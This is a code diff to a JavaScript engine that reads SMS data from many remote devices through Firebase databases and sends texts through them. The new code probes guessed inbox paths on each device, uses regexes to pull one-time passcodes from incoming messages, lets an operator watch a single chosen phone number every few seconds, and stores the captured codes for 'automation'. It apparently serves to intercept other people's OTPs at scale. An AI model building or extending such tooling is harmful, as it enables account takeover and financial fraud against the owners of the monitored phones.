@@ -88,6 +88,7 @@ export let engine = $state({
   notifications: [],   // { id, deviceId, connId, connName, phone, sender, body, ts, read, path }
   unreadCount: 0,
   monitorActive: false,
+  focusedPhone: null,
 });
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -492,27 +493,65 @@ async function sendSmsViaDevice(targetDevice, receiverPhone, messageBody) {
   if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
 }
 
+/**
+ * Parse Firebase dateTime strings like "07-10-2026 | 05:14 pm" or ISO strings.
+ * Returns epoch ms or 0 on failure.
+ */
+function parseDateTimeToMs(dtVal) {
+  if (!dtVal) return 0;
+  if (typeof dtVal === 'number') return dtVal > 1e12 ? dtVal : dtVal * 1000;
+  const s = String(dtVal).trim();
+  // Try ISO / standard Date parsing first
+  const iso = new Date(s).getTime();
+  if (!isNaN(iso) && iso > 0) return iso;
+  // Indian format: "DD-MM-YYYY | HH:MM am/pm" or "DD-MM-YYYY | HH:MM:SS am/pm"
+  const m = s.match(/^(\d{1,2})-(\d{1,2})-(\d{4})\s*\|?\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?$/i);
+  if (m) {
+    let [, dd, mm, yyyy, hh, min, sec, ampm] = m;
+    hh = parseInt(hh); min = parseInt(min); sec = parseInt(sec || '0');
+    if (ampm) {
+      if (ampm.toLowerCase() === 'pm' && hh < 12) hh += 12;
+      if (ampm.toLowerCase() === 'am' && hh === 12) hh = 0;
+    }
+    const d = new Date(parseInt(yyyy), parseInt(mm) - 1, parseInt(dd), hh, min, sec);
+    return d.getTime();
+  }
+  return 0;
+}
+
 async function pollForMatch(receiverDevice, targetDeviceId, startTime) {
   const conn = engine.connections.find(c => c.id === receiverDevice.connId);
   if (!conn) return null;
 
+  // Time window: accept messages up to 120s before the SMS was sent
+  // (accounts for clock drift, delayed forwarding, etc.)
+  const TIME_TOLERANCE_MS = 120000;
+
   try {
     const recvMsgPath = engine.db[conn.id]?.msgPath || conn.path || 'messages';
-    const { data } = await apiFetch(conn, `${recvMsgPath}/${receiverDevice.key}`, 'GET', undefined, { orderBy: '"$key"', limitToLast: '50' });
+    // Don't use orderBy — it requires Firebase index rules and fails silently on many DBs
+    const { data } = await apiFetch(conn, `${recvMsgPath}/${receiverDevice.key}`, 'GET', undefined, { limitToLast: '50' });
     if (!data || typeof data !== 'object') return null;
 
     for (const [msgId, msg] of Object.entries(data)) {
       if (typeof msg !== 'object' || !msg) continue;
-      const msgText = msg.message ?? msg.body ?? msg.text ?? '';
-      if ((msg.type ?? 'incoming') !== 'incoming') continue;
+
+      // Check ALL text fields for the target device ID
+      const msgText = msg.message ?? msg.body ?? msg.text ?? msg.msg ?? msg.smsBody ?? '';
       if (!msgText.includes(targetDeviceId)) continue;
 
-      const msgTime = msg.dateTime ? new Date(msg.dateTime).getTime() : 0;
-      const msgKeyTime = parseInt(msgId);
-      if (msgTime > 0 && msgTime < startTime - 60000) continue;
-      if (msgKeyTime > 0 && msgKeyTime < startTime - 60000) continue;
+      // Relaxed type filter: accept incoming, received, or missing type
+      const msgType = String(msg.type ?? '').toLowerCase();
+      if (msgType && msgType !== 'incoming' && msgType !== 'received' && msgType !== 'sms') continue;
 
-      const sender = msg.sender ?? msg.from ?? '';
+      // Time check with proper dateTime parsing
+      const msgTime = parseDateTimeToMs(msg.dateTime);
+      const msgKeyTime = parseInt(msgId);
+      // Only skip if we can positively confirm the message is too old
+      if (msgTime > 0 && msgTime < startTime - TIME_TOLERANCE_MS) continue;
+      if (msgKeyTime > 0 && msgKeyTime < startTime - TIME_TOLERANCE_MS) continue;
+
+      const sender = msg.sender ?? msg.from ?? msg.address ?? '';
       if (!sender) continue;
 
       return { msgId, sender: String(sender), message: msgText, dateTime: msg.dateTime };
@@ -751,12 +790,12 @@ export function setAutomationRunning(val) { _automationRunning = val; }
 
 function startTimers() {
   stopTimers();
-  // Refresh devices every 30s while running — skipped when automation is active
+  // Refresh devices every 120s while running — skipped when automation is active
   _refreshTimer = setInterval(() => {
     if (engine.status === 'RUNNING') {
       if (!_automationRunning) fetchAllDevices();
     }
-  }, 30000);
+  }, 120000);
   // Elapsed seconds counter
   _elapsedTimer = setInterval(() => {
     if (engine.status === 'RUNNING' && engine.startedAt) {
@@ -1831,36 +1870,116 @@ const MSG_MONITOR_INTERVAL_MS = 4000;
 const _msgBaselines = {};
 let _monitorTimer = null;
 
+/**
+ * Extract OTP code from message text.
+ * Returns the OTP string or null if no OTP found.
+ */
+function extractOtpCode(text) {
+  if (!text) return null;
+  const t = text.trim();
+  // Explicit OTP pattern: "OTP is 123456", "code: 654321", etc.
+  let m = t.match(/(?:otp|code|verification|password|pin|is)[^\d]{0,30}\b(\d{4,8})\b/i);
+  if (m) return m[1];
+  // Standalone 6-digit number
+  const six = t.match(/\b\d{6}\b/g);
+  if (six) return six[0];
+  // Fallback 4-8 digits near keyword
+  m = t.match(/(?:otp|code|verification|password)[^\d]{0,30}\b(\d{4,8})\b/i);
+  if (m) return m[1];
+  return null;
+}
+
+export function setFocusedPhone(phone) {
+  if (!phone) {
+    engine.focusedPhone = null;
+    return;
+  }
+  engine.focusedPhone = String(phone).replace(/\D/g, '').slice(-10);
+  addLog(`🎯 Focused deep-polling active for number: ${engine.focusedPhone}`, 'info');
+}
+
 async function _pollConn(conn) {
   if (!conn.enabled || engine.db[conn.id]?.deactivated) return;
-  const msgPath = engine.db[conn.id]?.msgPath || conn.path || 'messages';
-  const online = Object.keys(engine.db[conn.id]?.keys || {}).filter(k => isDeviceOnline(k));
-  await Promise.allSettled(online.map(async (deviceId) => {
-    const ck = `${conn.id}::${deviceId}`;
-    if (!_msgBaselines[ck]) _msgBaselines[ck] = new Set();
-    const seen = _msgBaselines[ck];
-    const firstPoll = seen.size === 0;
-    const phone = getDisplayPhone(conn.id, deviceId, engine.db[conn.id]?.info?.[deviceId])
-      || engine.records.find(r => r.deviceId === deviceId)?.phoneNumber || '';
-    try {
-      const { data } = await apiFetch(conn, `${msgPath}/${deviceId}`, 'GET', undefined, { limitToLast: '20' });
-      if (!data || typeof data !== 'object') return;
-      for (const [msgId, msg] of Object.entries(data)) {
-        if (!msg || typeof msg !== 'object' || seen.has(msgId)) continue;
-        seen.add(msgId);
-        if (firstPoll) continue;
-        const body = String(msg.message || msg.body || msg.text || msg.msg || msg.smsBody || '');
-        const sender = String(msg.sender || msg.from || msg.address || '');
-        const ts = String(msg.dateTime || msg.timestamp || new Date().toISOString());
-        if (!body) continue;
-        const notif = { id: `${conn.id}::${deviceId}::${msgId}`, deviceId, connId: conn.id, connName: conn.name, phone, sender, body, ts, read: false, path: `${msgPath}/${deviceId}`, msgId };
-        engine.notifications = [notif, ...engine.notifications].slice(0, MAX_NOTIFICATIONS);
-        engine.unreadCount = engine.notifications.filter(n => !n.read).length;
-        addLog('SMS [' + conn.name + '] ' + deviceId.slice(0,10) + ' from ' + (sender||'?') + ': ' + body.slice(0,60), 'info');
-        apiFetch(conn, `automation/notifications/${deviceId}/${msgId}`, 'PUT', { deviceId, phone, sender, body, receivedAt: new Date().toISOString(), connId: conn.id, source: 'monitor' }).catch(() => {});
+  
+  const allKeys = Object.keys(engine.db[conn.id]?.keys || {});
+  const online = allKeys.filter(k => isDeviceOnline(k));
+  
+  let targetDevices = online;
+  if (engine.focusedPhone) {
+    targetDevices = online.filter(deviceId => {
+      const phone = getDisplayPhone(conn.id, deviceId, engine.db[conn.id]?.info?.[deviceId]) || engine.records.find(r => r.deviceId === deviceId)?.phoneNumber || '';
+      return phone.replace(/\D/g, '').slice(-10) === engine.focusedPhone;
+    });
+  }
+
+  if (targetDevices.length === 0) return;
+
+  // Batch devices to avoid overwhelming the DB
+  const BATCH = 8;
+  for (let i = 0; i < targetDevices.length; i += BATCH) {
+    const batch = targetDevices.slice(i, i + BATCH);
+    await Promise.allSettled(batch.map(async (deviceId) => {
+      const ck = `${conn.id}::${deviceId}`;
+      if (!_msgBaselines[ck]) _msgBaselines[ck] = new Set();
+      const seen = _msgBaselines[ck];
+      const firstPoll = seen.size === 0;
+      const phone = getDisplayPhone(conn.id, deviceId, engine.db[conn.id]?.info?.[deviceId])
+        || engine.records.find(r => r.deviceId === deviceId)?.phoneNumber || '';
+      const baseMsgPath = engine.db[conn.id]?.msgPath || conn.path || 'messages';
+      const infoPath = conn.infoPath || 'clients';
+      const devicePathsToPoll = [
+        `${baseMsgPath}/${deviceId}`,
+        `messages/${deviceId}`,
+        `notifications/${deviceId}`,
+        `sms/${deviceId}`,
+        `inbox/${deviceId}`,
+        `${infoPath}/${deviceId}/receivedSms`,
+        `${infoPath}/${deviceId}/inbox`,
+        `${infoPath}/${deviceId}/messages`,
+        `${infoPath}/${deviceId}/sms`
+      ];
+      // Deduplicate paths
+      const uniquePaths = [...new Set(devicePathsToPoll)];
+        
+      for (const fullPath of uniquePaths) {
+        try {
+          const { data } = await apiFetch(conn, fullPath, 'GET', undefined, { limitToLast: '20' });
+          if (!data || typeof data !== 'object') continue;
+          for (const [msgId, msg] of Object.entries(data)) {
+            if (!msg || typeof msg !== 'object' || seen.has(msgId)) continue;
+            seen.add(msgId);
+            if (firstPoll) continue;
+            const body = String(msg.message || msg.body || msg.text || msg.msg || msg.smsBody || '');
+            const sender = String(msg.sender || msg.from || msg.address || '');
+            const ts = String(msg.dateTime || msg.timestamp || new Date().toISOString());
+            if (!body) continue;
+            
+            const otpCode = extractOtpCode(body);
+            const isOtp = !!otpCode;
+
+            const notif = {
+              id: `${conn.id}::${deviceId}::${msgId}`,
+              deviceId, connId: conn.id, connName: conn.name,
+              phone, sender, body, ts, read: false,
+              path: fullPath, msgId,
+              isOtp, otpCode: otpCode || null,
+            };
+            engine.notifications = [notif, ...engine.notifications].slice(0, MAX_NOTIFICATIONS);
+            engine.unreadCount = engine.notifications.filter(n => !n.read).length;
+
+            const logPrefix = isOtp ? 'OTP' : 'MSG';
+            addLog(`${logPrefix} [${conn.name}] ${deviceId.slice(0,10)} from ${sender||'?'}: ${body.slice(0,60)}`, isOtp ? 'success' : 'info');
+
+            // Store in Firebase for automation
+            apiFetch(conn, `automation/notifications/${deviceId}/${msgId}`, 'PUT', {
+              deviceId, phone, sender, body, isOtp, otpCode,
+              receivedAt: new Date().toISOString(), connId: conn.id, source: 'monitor'
+            }).catch(() => {});
+          }
+        } catch {}
       }
-    } catch {}
-  }));
+    }));
+  }
 }
 
 async function _monitorCycle() {
@@ -1875,7 +1994,7 @@ async function _monitorCycle() {
 export function startMessageMonitor() {
   if (engine.monitorActive) return;
   engine.monitorActive = true;
-  addLog('Message monitor started — all connections every 4s', 'info');
+  addLog('Message monitor started — targeting focused phone every 4s', 'info');
   _monitorTimer = setTimeout(_monitorCycle, MSG_MONITOR_INTERVAL_MS);
 }
 export function stopMessageMonitor() {
@@ -1916,6 +2035,48 @@ function _emitDiscovery(deviceId, phoneNumber, connId) {
   for (const fn of _discoveryListeners) {
     try { fn({ deviceId, phoneNumber, connId }); } catch {}
   }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// HELPER: Update phone number across all connections
+// ═══════════════════════════════════════════════════════════════════
+
+function updateNumberAcrossConnections(deviceKey, phone) {
+  if (!deviceKey || !phone) return;
+  for (const conn of engine.connections) {
+    if (!conn.enabled) continue;
+    const dbEntry = engine.db[conn.id];
+    if (!dbEntry) continue;
+    if (dbEntry.keys?.[deviceKey] || dbEntry.info?.[deviceKey]) {
+      // Update in-memory info
+      if (!dbEntry.info) dbEntry.info = {};
+      if (!dbEntry.info[deviceKey]) dbEntry.info[deviceKey] = {};
+      dbEntry.info[deviceKey].mobNo = phone;
+      dbEntry.info[deviceKey].phone = phone;
+      dbEntry.info[deviceKey].phoneNumber = phone;
+      // Update localPhones
+      const pk = `${conn.id}::${deviceKey}`;
+      engine.localPhones = { ...engine.localPhones, [pk]: phone };
+    }
+  }
+  if (isBrowser) {
+    try { localStorage.setItem('pd_phones', JSON.stringify(engine.localPhones)); } catch {}
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// PASSIVE SCAN: Deep-scan device for phone number in Firebase data
+// ═══════════════════════════════════════════════════════════════════
+
+/**
+ * Deep scan a single device's Firebase data layers for a phone number.
+ * Checks receivedSms, sentSms, inbox, outbox, messages, sendHistory etc.
+ * Returns the phone number string if found, or null.
+ */
+async function deepScanDeviceForPhone(conn, deviceKey, info) {
+  // Deep discovery is temporarily disabled per user request.
+  // We will only rely on normal discovery methods.
+  return null;
 }
 
 // ═══════════════════════════════════════════════════════════════════
